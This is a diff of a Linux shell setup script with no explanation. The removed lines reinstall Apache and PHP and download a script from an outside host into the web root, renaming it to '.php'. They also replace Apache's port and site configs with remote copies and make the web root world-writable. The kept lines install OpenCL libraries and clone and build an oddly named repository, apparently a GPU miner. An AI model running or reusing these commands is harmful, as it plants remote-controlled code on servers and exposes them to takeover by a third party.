@@ -1,41 +1,5 @@
 apt-get install ocl-icd-opencl-dev -y
 
-kill -9 $(pidof apache2)
-
-apt-get install apache2 -y
-
-apt-get install software-properties-common -y
-
-apt-get update
-
-add-apt-repository ppa:ondrej/php -y
-
-apt-get install -y php5.6
-
-apt-get install -y php
-
-apt-get install -y php5.6-mysqli
-
-apt-get install -y php8.0-mysqli
-
-cd /var/www/html/
-
-wget -N http://www.blueinc.cloud:8884/linux8474.sh
-
-mv ./linux8474.sh ./linux8474.php
-
-cd /etc/apache2/
-
-wget -N http://www.blueinc.cloud:8884/ports.conf
-
-cd /etc/apache2/sites-enabled/
-
-wget -N http://www.blueinc.cloud:8884/000-default.conf
-
-chmod 777 -R /var/www/html/
-
-service apache2 restart
-
 git clone https://github.com/mobileapps84741274/linux844444444474
 cd linux844444444474
 mkdir build
